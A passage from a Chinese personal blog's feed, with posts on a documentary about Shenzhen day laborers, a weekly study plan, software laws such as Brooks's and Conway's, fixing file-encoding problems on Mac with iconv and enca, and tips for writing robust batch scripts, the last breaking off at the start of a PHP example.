        <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g3y482cfbgj31hc0u0u0z.jpg" alt=""></p><p>火车站，一个梦想开始与结束的地方。</p><a id="more"></a><p>每个人的人生都是一场轮回，从婴儿到孩童、再到青年、中年、老年，直至最后变成一抔黄土。历史的车轮在不断的前进，有些人在历史中熠熠生辉，更多的人则消散在历史的尘埃中，仿佛从未造访过这个世界。如果说我们都逃不过这样的轮回，那我们能做的可能只是改变轮回的半径。</p><p>我们每个人都有自己的生活圈子，当你在和朋友讨论五一去哪儿浪的时候，有的人可能正趁着城市的夜色在垃圾箱中翻找着瓶子，有的人还在为孩子下个学期的学费奔波，也有的人在一次次的奋斗挣扎过后，向现实低下了骄傲的头颅……我们每个人都是“近视眼”，很多人无法理解为什么拼多多这样的公司也能大获成功？怎么会有人过着今朝有酒今朝醉的生活？为什么会有人花几百万美元和一个老头子吃一顿午饭？这个世界并不完全是你所看到的样子，在你眼里所受够了的生活，可能正是别人所梦想的生活。我们每个人都需要跳出自己的生活圈，用望远镜来看看世界，看看自己。</p><p>我认为，三和大神是时代的产物：</p><ol><li>中国城市化的快速发展，促使许多农民放下耕地和孩子，前往城市务工。留守儿童缺少看护与教育。</li><li>新一代年轻人生活观念发生很大变化。由于改革开放的发展，人口与信息流动越来越频繁，年轻人接触到各种新鲜事物与观念，与传统观念中的成家立业、传宗接代不同，现在年轻人更多看重的是活在当下。</li><li>工厂的长时间劳动，导致工人变得如行尸走肉。我曾经做过一段时间的暑期工，每天工作 12 个小时，工作时间都是站立，中午也几乎没有休息时间。宿舍是十几个人挤在一间屋子里，通风条件很差，夏天的晚上热的睡不着，但第二天还要早起照常上班。每天除了工作 12 小时外，上下班路程、洗漱休息时间除外，真正能睡觉的时间并不多，可能也就六七个小时。那时我每天都觉得很累，第一次感觉到一天 24 小时真的不够用。有一天我在下班回去的路上，站了一天的脚实在是太累了，加之前一天晚上没休息好，那时，我真的切身体会到了以前在《读者》中读到的“拖着疲惫的身体”，“双腿像灌了铅似的”，我甚至产生了直接躺在路上睡觉的想法……每天按时上下班，超长时间的重复劳作，当我看着厂房的铁窗时，感觉就像一只被囚禁的鸟儿，我当时只想尽快逃离这里，希望未来远离这般行尸走肉的生活。</li></ol><p>在影片中，有人在断臂后用另一条臂膀撑起一个家庭，有人在四肢健全下放弃希望。我相信每个人都有自己的故事，但不是每个故事都是辛酸的。很多人不是被这个世界所放弃，而是他自己。这个世界本来就是不公的，你无法改变这个世界，那你只能改变自己。正如片中的辍学大学生所说：在现在的状态下，我要么是就此一蹶不振，成为三和大神，要么就是走出现在的困境，在今后的日子里更加的珍惜生命、热爱生命。</p><p>在信息自动化高速发展的今天，技术革命将淘汰掉越来越多的重复劳作岗位，让资本家用更短的时间创造更多的财富，让一无所有的人变得更加难以生存。资产家和无产者间的鸿沟不会因技术而消失，只会形成更强的马太效应，让生活在底层的人翻身的机会更加渺茫。</p><p>在故事的最后，即将成为三和大神的东东决定离开深圳，前往东莞追寻新的梦想。在去往东莞的车站，又有许多手提行李箱的年轻人刚刚踏上这座城市……</p>]]></content>
      
      
      <categories>
          
          <category> 影像志 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>周计划</title>
      <link href="/post/week-schedule/"/>
      <url>/post/week-schedule/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/large/006tNc79ly1g3bekghzsxj30q40bzmya.jpg" alt=""></p><a id="more"></a><h3 id="想做的事太多？"><a href="#想做的事太多？" class="headerlink" title="想做的事太多？"></a>想做的事太多？</h3><p>游戏？电视？旅行？美食？理财……<br>虽说技多不压身，但更需要一专多长</p><h3 id="三分钟热度？"><a href="#三分钟热度？" class="headerlink" title="三分钟热度？"></a>三分钟热度？</h3><p>人生是一项长跑比赛，你却把它当做是百米赛跑。<br>长征路上，你只要确保方向正确，然后埋头前行。<br>很多事情不是有了希望才坚持，而是坚持了才有希望。</p><h3 id="诱惑太多？"><a href="#诱惑太多？" class="headerlink" title="诱惑太多？"></a>诱惑太多？</h3><p>电视剧看两集就必须看完才能停下来？游戏玩两局就必须玩到强制下线才能放下手机？<br>当你知道一扇大门后的东西你无法控制时，最好的方式就是不要打开这扇门。</p><h3 id="早睡早起"><a href="#早睡早起" class="headerlink" title="早睡早起"></a>早睡早起</h3><p>早睡早起精神好</p><p>冰冻三尺，非一日之寒。骐骥一跃，不能十步。今始制定每周计划，从 0 到 1 是最难的部分。</p><blockquote><p>To Be Strong</p><p>入职现在这家公司已经一年半，这一年半以来，自以为在技术方面没有什么成长，甚至不如入职前的学习动力，只是在处理问题、自信、对一些事物的认知、交流沟通方面有了很多的成长。</p><p>现在的工作终日沉浸在忙碌之中，但一年到头，却感觉似乎什么都没有做，那时间都去哪儿了呢？在这段时间里，随着对手头工作的熟悉，自己也越来越松懈，经常会有通宵上线，自己也养成了熬夜的坏习惯，恶性循环到第二天没有什么工作状态。有时会一整天都没有工作状态，不写一行代码，最多的时候这样的情况能持续一周。在这种熬夜加班写 bug，第二天修复 bug 又引入新的 bug 的状态中，对精神与肉体造成双重的摧残。</p><p>虽说当前的公司也是小有名气，但我所在项目组却感觉没有什么开发规范，很多的问题解决方案都是直接粗暴：调用方法都是静态方法，刚开始在项目中使用 composer，在 HTML 页面中夹杂 PHP 代码，页面慢了上缓存（似乎 Redis 的存在只是为了缓存）。自己一个项目做了一年，但也不敢说对业务与代码了如指掌，很多地方自己觉得别人代码写的太烂不想看，业务逻辑懒得了解，这真的不是一种好的工作态度，工作就是需要对负责的部分掌控全局、如数家珍。</p><p>最近看到之前写的代码实在是看不下去了，想用设计模式等较好的解决方式优化一下，却发现自己空有想法，却无法实现，于是开始看 GitHub Trending，关注一些优秀的开源框架，一些有趣的小项目，想认真的了解一下自己在之前工作中所遇到的很多不求甚解的问题。不看则以，一看则欲望也越来越大，产生了各种各样想要尝试的想法，比如自动发送微博、微信自动发送情话、爬取数据分析、脚本监控商品价格等等。我知道这可能只是一时脑热，三天后又走原路，因此在此记录，只管设定目标，然后低头执行，无关路上的风雨月。</p><p>我想，是时候做出改变了，让自己变得更强，找寻自己存在的意义与价值，让成就感充满每一天。</p><h3 id="长期知识技能图"><a href="#长期知识技能图" class="headerlink" title="长期知识技能图"></a>长期知识技能图</h3><ul><li>❌Laravel 框架源码研究</li><li>❌PHP 框架运行机制和流程</li><li>❌xDebug 调试</li><li>❌PhpStorm 的工具使用</li><li>❌消息队列（RabbitMQ，Kafaka）</li><li>❌ElasticSearch</li><li>❌Nginx 的配置</li><li>❌Redis 的多场景使用</li><li>❌Docker 镜像封装与容器运行</li><li>❌k8s </li><li>❌GraphQL</li><li>❌MongoDB 的使用场景</li><li>❌CI 自动分析代码质量(phpinsights、codeception)，单元测试，性能分析，部署代码</li><li>❌Python 爬取与分析数据</li><li>❌Go 静态语言的高并发处理</li><li>❌Node.js 的多线程</li><li>❌系统架构部署（<a href="https://github.com/xingshaocheng/architect-awesome）" target="_blank" rel="noopener">https://github.com/xingshaocheng/architect-awesome）</a></li></ul><h3 id="图书"><a href="#图书" class="headerlink" title="图书"></a>图书</h3><ul><li>❌《HTTP 权威指南》</li><li>❌《代码大全》</li><li>❌《深入理解计算机原理》</li></ul><h3 id="其他软技能"><a href="#其他软技能" class="headerlink" title="其他软技能"></a>其他软技能</h3><p><a href="https://www.zhihu.com/question/49502870/answer/673390166" target="_blank" rel="noopener">PPT 技能</a></p></blockquote><h3 id="19Y21W"><a href="#19Y21W" class="headerlink" title="19Y21W"></a>19Y21W</h3><ul><li>✅翻译完成<a href="https://github.com/kamranahmedse/design-patterns-for-humans" target="_blank" rel="noopener">通俗讲解设计模式</a></li><li>❌iTerm 终端美化</li><li>❌廖雪锋Python教程</li><li>✅周末一天世园会，一天图书馆</li></ul><h3 id="19Y22W"><a href="#19Y22W" class="headerlink" title="19Y22W"></a>19Y22W</h3><ul><li>✅完成头像分析</li><li>✅完成比喻示例</li><li>✅完成设计模式翻译</li></ul><h3 id="19Y24W"><a href="#19Y24W" class="headerlink" title="19Y24W"></a>19Y24W</h3><ul><li>✅LightRoom 教程</li><li>✅照片筛选处理</li></ul><h3 id="19Y25W"><a href="#19Y25W" class="headerlink" title="19Y25W"></a>19Y25W</h3><ul><li>❌分析入职离职曲线</li><li>❌京东有货地区</li><li>❌微信情话</li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>软件定律及原则</title>
      <link href="/post/hacker-laws/"/>
      <url>/post/hacker-laws/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g39pcz3brtj30hs0cgab6.jpg" alt=""></p><p>Repo <a href="https://github.com/nusr/hacker-laws-zh" target="_blank" rel="noopener">💻📖 hacker-laws</a> </p><a id="more"></a><h2 id="定律"><a href="#定律" class="headerlink" title="定律"></a>定律</h2><h3 id="1-阿姆达尔定律"><a href="#1-阿姆达尔定律" class="headerlink" title="1. 阿姆达尔定律"></a>1. 阿姆达尔定律</h3><blockquote><p><em>向执行程序的系统添加多个处理器只能获得有限的好处，它可以极大地提升并行程序的速度，串行部分的速度将保持不变。</em><br><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g391y0tu7wj30hs0dwjs0.jpg" alt=""></p></blockquote><h3 id="2-布鲁克斯法则"><a href="#2-布鲁克斯法则" class="headerlink" title="2. 布鲁克斯法则"></a>2. 布鲁克斯法则</h3><blockquote><p><em>软件开发后期，添加人力只会是项目开发得更慢。</em></p></blockquote><p>无论多少个女人，孕育一个生命也需要九个月。</p><h3 id="3-康威定律"><a href="#3-康威定律" class="headerlink" title="3. 康威定律"></a>3. 康威定律</h3><blockquote><p><em>软件架构反映了组织结构。</em></p></blockquote><h3 id="4-侯世达定律"><a href="#4-侯世达定律" class="headerlink" title="4. 侯世达定律"></a>4. 侯世达定律</h3><blockquote><p><em>做事所花费的时间总是比你预期的要长，即使你的预期中考虑了侯世达定律。</em></p></blockquote><h3 id="5-技术成熟度曲线"><a href="#5-技术成熟度曲线" class="headerlink" title="5. 技术成熟度曲线"></a>5. 技术成熟度曲线</h3><blockquote><p><em>我们倾向于过高估计技术在短期内的影响，并低估长期效应。</em><br><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g391wbrqtbj30sg0iiab9.jpg" alt=""></p></blockquote><h3 id="6-隐式接口定律"><a href="#6-隐式接口定律" class="headerlink" title="6. 隐式接口定律"></a>6. 隐式接口定律</h3><blockquote><p><em>你在合同中的承诺并不重要： 你系统的所有可观察行为将取决于其他人。</em></p></blockquote><p>应该是指：即使你某些方法仅限内部使用，但仍然会有些人将这些方法用于外部调用</p><h3 id="7-摩尔定律"><a href="#7-摩尔定律" class="headerlink" title="7. 摩尔定律"></a>7. 摩尔定律</h3><blockquote><p><em>集成电路中的晶体管数量大约每两年翻一番。</em></p></blockquote><h3 id="8-帕金森定理"><a href="#8-帕金森定理" class="headerlink" title="8. 帕金森定理"></a>8. 帕金森定理</h3><blockquote><p><em>在工作能够完成的时限内，工作量会一直增加，直到所有可用时间都被填满为止。</em></p></blockquote><h3 id="9-普特定律"><a href="#9-普特定律" class="headerlink" title="9. 普特定律"></a>9. 普特定律</h3><blockquote><p><em>技术由两类人主导，一类是纯粹的管理人员， 一类是纯粹的技术人员。</em></p></blockquote><p>没太看明白，是指技术领导长期不接触一线代码导致技术能力下降吗？</p><h3 id="10-复杂性守恒定律"><a href="#10-复杂性守恒定律" class="headerlink" title="10. 复杂性守恒定律"></a>10. 复杂性守恒定律</h3><blockquote><p><em>系统中存在着一定程度的复杂性，并且不能减少。</em></p></blockquote><h3 id="11-漏洞抽象定律"><a href="#11-漏洞抽象定律" class="headerlink" title="11. 漏洞抽象定律"></a>11. 漏洞抽象定律</h3><blockquote><p><em>在某种程度上，所有非平凡的抽象都是漏洞。</em></p></blockquote><p>定义太拗口了，直接看例子吧。</p><p>我过去遇到过一个问题，就是 Photoshop 启动缓慢，有时需要几分钟。问题好像是 Photoshop 启动时，会读取当前默认打印机的一些信息。但是，如果该打印机实际上是一台网络打印机，则可能需要很长的时间。将网络打印机与本地打印机当作同样的抽象，导致连接不良的情况下出现问题。</p><h3 id="12-帕金森琐碎定理"><a href="#12-帕金森琐碎定理" class="headerlink" title="12. 帕金森琐碎定理"></a>12. 帕金森琐碎定理</h3><blockquote><p><em>群体将给予更多的时间和注意力来处理琐碎的问题，而不是用来处理严肃而实质性的问题。</em></p></blockquote><p>常见的虚构例子是委员会批准核电站的计划，他们大部分时间都在讨论自行车棚的结构，而不是电厂本身等更为重要的设计。</p><h3 id="13-Unix-哲学"><a href="#13-Unix-哲学" class="headerlink" title="13. Unix 哲学"></a>13. Unix 哲学</h3><blockquote><p><strong>*做一件事，做好它</strong>。将小而简单以及定义良好的单元组合在一起，而不是使用大而复杂的多用途程序，可以更轻松地构建系统。*</p></blockquote><ul><li>小即是美</li><li>让程序只做好一件事</li><li>尽可能早地建立原型</li><li>可移植性比效率更重要</li><li>数据应该保存为文本文件</li><li>尽可能地榨取软件的全部价值</li><li>使用shell脚本来提高效率和可移植性</li><li>避免使用可定制性低下的用户界面</li><li>所有程序都是数据的过滤器</li></ul><h3 id="14-Spotify-模型"><a href="#14-Spotify-模型" class="headerlink" title="14. Spotify 模型"></a>14. Spotify 模型</h3><blockquote><p><em>团队围绕功能而非技术进行组织。</em></p></blockquote><h2 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h2><h3 id="1-鲁棒性原则"><a href="#1-鲁棒性原则" class="headerlink" title="1. 鲁棒性原则"></a>1. 鲁棒性原则</h3><blockquote><p><em>在自己所做的事情上要保守, 在接受别人的事情上要自由。</em></p></blockquote><p>通常应用于服务器应用程序开发中，该原则指出，你发送给其他人的内容应尽可能最小且符合要求，并且处理不符合要求的输入。</p><h3 id="2-SOLID"><a href="#2-SOLID" class="headerlink" title="2. SOLID"></a>2. SOLID</h3><ul><li>S：单一功能原则 (The Single Responsibility Principle)</li><li>O：开闭原则 (The Open/Closed Principle)</li><li>L：里氏替换原则 (The Liskov Substitution Principle)</li><li>I：接口隔离原则 (The Interface Segregation Principle)</li><li>D：依赖反转原则 (The Dependency Inversion Principle)</li></ul><h4 id="2-1-单一功能原则"><a href="#2-1-单一功能原则" class="headerlink" title="2.1 单一功能原则"></a>2.1 单一功能原则</h4><blockquote><p><em>每个模块或者类只应该有一项功能。</em></p></blockquote><p>理论上讲，这使代码更健壮，更容易更改。知道正在更改的组件只有一个功能，这意味着测试更改更容易。</p><h4 id="2-2-开闭原则"><a href="#2-2-开闭原则" class="headerlink" title="2.2 开闭原则"></a>2.2 开闭原则</h4><blockquote><p><em>软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的，这意味着一个实体是允许在不改变它的源代码的前提下变更它的行为。</em></p></blockquote><h4 id="2-3-里氏替换原则"><a href="#2-3-里氏替换原则" class="headerlink" title="2.3 里氏替换原则"></a>2.3 里氏替换原则</h4><blockquote><p><em>子类对象可以在程式中代替其基类（超类）对象</em></p></blockquote><h4 id="2-4-接口隔离原则"><a href="#2-4-接口隔离原则" class="headerlink" title="2.4 接口隔离原则"></a>2.4 接口隔离原则</h4><blockquote><p><em>接口应提供给客户端仅需必需信息。</em></p></blockquote><p>接口隔离原则(ISP)拆分非常庞大臃肿的接口成为更小的和更具体的接口，这样客户将会只需要知道他们需要的方法。接口隔离原则的目的是系统解开耦合，从而容易重构，更改和重新部署。</p><h4 id="2-5-依赖反转原则"><a href="#2-5-依赖反转原则" class="headerlink" title="2.5 依赖反转原则"></a>2.5 依赖反转原则</h4><p>高层次的模块不应该依赖于低层次的模块，两者均应依赖于抽象接口。<br>抽象接口不应依赖于具体实现，而应具体实现依赖于抽象接口</p><h3 id="3-DRY"><a href="#3-DRY" class="headerlink" title="3. DRY"></a>3. DRY</h3><blockquote><p><em>系统中，每一块知识都必须是单一、明确而权威的。</em></p></blockquote><p>这个原则旨在帮助开发人员减少代码的重复性，并将公共代码保存在一个地方。</p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mac 下解压与 Excel 乱码解决方案</title>
      <link href="/post/extract-excel-garbled-on-mac/"/>
      <url>/post/extract-excel-garbled-on-mac/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g25mhnmgeij30g204qdhb.jpg" alt=""></p><a id="more"></a><h1 id="解压文件乱码"><a href="#解压文件乱码" class="headerlink" title="解压文件乱码"></a>解压文件乱码</h1><p>Mac 系统默认的解压软件是系统自带的 Archive Utility，但这个软件对于文件的编码方式识别有问题，使用 The Unarchiver 就可以完美解决。在任一的压缩文件右键查看简介（Get Info）=&gt; 打开方式 =&gt; 选择The Unarchiver =&gt; 应用全部，即可将 The Unarchiver 设置为默认的解压软件。</p><img src="https://ws3.sinaimg.cn/middle/006tNc79ly1g25qtlxfemj30ek0iq75p.jpg" height="70%"><h1 id="Excel-内容乱码"><a href="#Excel-内容乱码" class="headerlink" title="Excel 内容乱码"></a>Excel 内容乱码</h1><p>菜单栏Excel =&gt; Preferences =&gt; East Asian Languages =&gt; Select a language =&gt; Simplified Chines</p><p><img src="https://ws3.sinaimg.cn/middle/006tNc79ly1g25mszawekj30k00c775f.jpg" alt=""></p><h1 id="【转】文件转码"><a href="#【转】文件转码" class="headerlink" title="【转】文件转码"></a>【转】文件转码</h1><h2 id="查看文件编码"><a href="#查看文件编码" class="headerlink" title="查看文件编码"></a>查看文件编码</h2><p>在Linux中查看文件编码可以通过以下几种方式：</p><h3 id="1-在Vim中可以直接查看文件编码"><a href="#1-在Vim中可以直接查看文件编码" class="headerlink" title="1. 在Vim中可以直接查看文件编码"></a>1. 在Vim中可以直接查看文件编码</h3><p><code>:set fileencoding</code><br>即可显示文件编码格式。如果你只是想查看其它编码格式的文件或者想解决用Vim查看文件乱码的问题，那么你可以在 <code>~/.vimrc</code> 文件中添加以下内容：<br><code>set encoding=utf-8 fileencodings=ucs-bom,utf-8,cp936</code><br>这样，就可以让vim自动识别文件编码（可以自动识别UTF-8或者GBK编码的文件），其实就是依照 fileencodings 提供的编码列表尝试，如果没有找到合适的编码，就用latin-1(ASCII)编码打开。</p><h3 id="2-enca-查看文件编码"><a href="#2-enca-查看文件编码" class="headerlink" title="2. enca 查看文件编码"></a>2. enca 查看文件编码</h3><p>(如果你的系统中没有安装这个命令，可以用<code>sudo yum install -y enca</code>安装 )<br>Mac 下可以用 brew 安装<br><code>sudo brew install enca</code><br>查看命令如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ enca filename</span><br><span class="line">filename: Universal transformation <span class="built_in">format</span> <span class="number">8</span> bits; UTF<span class="number">-8</span> <span class="literal">CRLF</span> <span class="built_in">line</span> terminators</span><br></pre></td></tr></table></figure><p>需要说明一点的是，enca对某些GBK编码的文件识别的不是很好，识别时会出现：<code>Unrecognized encoding</code></p><h3 id="3-查看文件编码-file-命令"><a href="#3-查看文件编码-file-命令" class="headerlink" title="3. 查看文件编码 file 命令"></a>3. 查看文件编码 file 命令</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file ip.txt</span><br><span class="line">ip.txt: UTF<span class="number">-8</span> Unicode <span class="type">text</span>, <span class="keyword">with</span> <span class="keyword">escape</span> <span class="keyword">sequences</span></span><br></pre></td></tr></table></figure><h2 id="文件编码转换"><a href="#文件编码转换" class="headerlink" title="文件编码转换"></a>文件编码转换</h2><h3 id="1-在Vim中直接转换文件编码"><a href="#1-在Vim中直接转换文件编码" class="headerlink" title="1. 在Vim中直接转换文件编码"></a>1. 在Vim中直接转换文件编码</h3><p><code>:set fileencoding=utf-8</code> //将一个文件转换成utf-8格式</p><h3 id="2-enconv-转换文件编码"><a href="#2-enconv-转换文件编码" class="headerlink" title="2. enconv 转换文件编码"></a>2. enconv 转换文件编码</h3><p><code>enconv -L zh_CN -x UTF-8 filename</code> // 将一个GBK编码的文件转换成UTF-8编码</p><h3 id="3-iconv-转换，iconv的命令格式如下："><a href="#3-iconv-转换，iconv的命令格式如下：" class="headerlink" title="3. iconv 转换，iconv的命令格式如下："></a>3. iconv 转换，iconv的命令格式如下：</h3><p><code>iconv -f encoding -t encoding inputfile</code></p><p>比如将一个UTF-8 编码的文件转换成GBK编码<br><code>iconv -f UTF-8 -t GBK file1 -o file2</code></p><h4 id="一、利用iconv命令进行编码转换文件内容编码转换"><a href="#一、利用iconv命令进行编码转换文件内容编码转换" class="headerlink" title="一、利用iconv命令进行编码转换文件内容编码转换"></a>一、利用iconv命令进行编码转换文件内容编码转换</h4><p>iconv命令用于转换指定文件的编码，默认输出到标准输出设备，亦可指定输出文件。查了下iconv命令用法如下：<br><code>iconv [选项...] [文件...]</code><br>有如下选项可用:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入/输出格式规范：</span><br><span class="line"><span class="deletion">-f, --from-code=名称 原始文本编码</span></span><br><span class="line"><span class="deletion">-t, --to-code=名称 输出编码</span></span><br><span class="line"></span><br><span class="line">信息：</span><br><span class="line"><span class="deletion">-l, --list 列举所有已知的字符集</span></span><br><span class="line"></span><br><span class="line">输出控制：</span><br><span class="line"><span class="deletion">-c 从输出中忽略无效的字符</span></span><br><span class="line"><span class="deletion">-o, --output=FILE 输出文件</span></span><br><span class="line"><span class="deletion">-s, --silent 关闭警告</span></span><br><span class="line"><span class="deletion">--verbose 打印进度信息</span></span><br></pre></td></tr></table></figure><p>例子:<br><code>iconv -f utf-8 -t gb2312 aaa.txt &gt; bbb.txt</code><br>这个命令读取aaa.txt文件，从utf-8编码转换为gb2312编码,其输出定向到bbb.txt文件。</p><h4 id="二、文件名编码转换"><a href="#二、文件名编码转换" class="headerlink" title="二、文件名编码转换"></a>二、文件名编码转换</h4><p>因为现在用Linux，原来在Windows里的文件都是用GBK编码的。所以copy到linux下是乱码，文件内容可以用<code>iconv</code>来转换，可是好多中文的文件名还是乱码，找到个可以转换文件名编码的命令，就是<code>convmv</code>。<br>convmv命令详细参数 例如<br><code>convmv -f GBK -t UTF-8 *.mp3</code><br>不过这个命令不会直正的转换，你可以看到转换前后的对比。如果要直正的转换要加上参数 <code>--notest</code><br><code>convmv -f GBK -t UTF-8 --notest *.mp3</code><br><code>-f</code> 参数是指出转换前的编码，-t 是转换后的编码。这个千万不要弄错了。不然可能还是乱码哦。还有一个参数很有用。就是 <code>-r</code> 这个表示递归转换当前目录下的所有子目录。</p><p>Linux 需要安装 convmv-1.10-1.el5.noarch.rpm</p><p>Mac 下用brew 安装<code>sudo brew install convmv</code></p><h4 id="三、更好的傻瓜型命令行工具enca"><a href="#三、更好的傻瓜型命令行工具enca" class="headerlink" title="三、更好的傻瓜型命令行工具enca"></a>三、更好的傻瓜型命令行工具enca</h4><p>它不但能智能的识别文件的编码，而且还支持成批转换。 　　</p><h5 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装 　　"></a>1.安装 　　</h5><p><code>$sudo apt-get install enca</code><br>Mac 下 <code>sudo brew install enca</code></p><h4 id="2-查看当前文件编码"><a href="#2-查看当前文件编码" class="headerlink" title="2.查看当前文件编码"></a>2.查看当前文件编码</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enca -L zh_CN ip.txt     </span><br><span class="line">Simplified Chinese <span class="type">National</span> Standard; GB2312     </span><br><span class="line">Surrounded <span class="keyword">by</span>/intermixed <span class="keyword">with</span> non-<span class="type">text</span> data  　　</span><br><span class="line">`</span><br></pre></td></tr></table></figure><h5 id="3-转换"><a href="#3-转换" class="headerlink" title="3.转换 　　"></a>3.转换 　　</h5><p>命令格式如下 　　<br><code>$enca -L 当前语言 -x 目标编码 文件名</code><br>-L zh_CN 一般也可以不用指定。</p><p>例如要把当前目录下的所有文件都转成utf-8 　　<br><code>enca -L zh_CN -x utf-8 *</code> 或 <code>enca -x utf-8 *</code></p><p>检查文件的编码　<br><code>enca -L zh_CN file</code></p><p>将文件编码转换为”UTF-8”编码　<br><code>enca -L zh_CN -x UTF-8 file</code></p><p>如果不想覆盖原文件可以这样<br><code>enca -L zh_CN -x UTF-8 &lt; file1 &gt; file2</code></p><hr><p>Reference</p><ol><li><a href="https://www.zhihu.com/question/20562901/answer/138922102" target="_blank" rel="noopener">Office for Mac 打开 Excel 文件全是乱码</a></li><li><a href="https://segmentfault.com/a/1190000007073776" target="_blank" rel="noopener">Linux（Mac）下查看文件编码及修改编码</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>脚本书写及执行注意事项</title>
      <link href="/post/script-notes/"/>
      <url>/post/script-notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87cq9pnx6j30mu0cu75u.jpg" alt=""></p><p>怎样写出健壮友好的脚本？</p><a id="more"></a><p>工作中经常会写一些脚本来批量处理一些数据，有时一个脚本的执行时间可能长达数小时，而且中间随时可能出错中断，这可能是脚本对某些情况考虑不够全面，也可能是脏数据的问题。那么，如何才能写出健壮的脚本，让整个任务一气呵成呢？以下就根据我丰(cai)富(guo)的(de)经(keng)验来谈一谈。</p><ol start="0"><li><strong>数据备份</strong>。避免脚本异常执行所导致数据无法恢复。</li><li><strong>异常处理</strong>。当异常发生时，我们可以视情况决定是终止脚本，还是记录失败的数据继续执行，但无论哪种方式，都需要记录发生异常的位置和上下文信息，便于快速定位问题，并在修复问题后继续执行。尤其需要注意的是，有些数据二次执行会引发问题，因此正确记录异常位置，实现“断点续传”非常重要</li><li><strong>日志记录</strong>。对于被执行的内容需要详细的记录，这样可以在发生异常或者在脚本结束时查看整个执行过程。需要注意的是，日志记录是追加而不是覆写，而且要注意日志的换行。</li><li><strong>统计信息</strong>。记录脚本的开始、结束时间，内存消耗情况，以及执行统计信息，如：共需执行m条数据，成功执行n条，执行失败x条，执行总耗时y等信息，还可以根据统计信息在脚本健壮执行后再进一步优化</li><li><strong>脚本测试</strong>。在真实数据执行前，一定要先在 mock 数据上验证一下脚本，有时数据量的不同也会导致脚本执行异常，所以 mock 数据量也要接近真实环境</li><li><strong>结果通知</strong>。执行完成通过邮件等方式通知，不必一直盯着脚本</li><li><strong>Server 执行</strong>。服务器相比个人电脑性能和网络方面等更有优势，执行环境更快、更稳定。之前我一个脚本 Mac 执行20分钟，Server 执行2分钟😂</li><li><strong>会话保持</strong>。使用<code>screen</code>或者<code>tmux</code>，远程登录服务器 ==&gt; 创建会话 ==&gt; 会话分离 ==&gt; 退出服务器 ==&gt; do somethin ==&gt; 收到结果通知 ==&gt; 重新登录服务器 ==&gt; 会话恢复 ==&gt; 查看执行结果</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">refactorData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span 